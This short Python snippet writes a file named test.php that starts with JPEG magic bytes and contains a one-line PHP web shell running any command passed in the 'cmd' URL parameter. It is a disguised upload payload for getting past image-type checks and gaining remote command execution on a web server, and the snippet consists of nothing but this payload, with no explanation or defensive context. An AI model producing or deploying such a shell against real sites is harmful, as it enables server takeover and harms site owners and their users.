fh = open('test.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
fh.close()
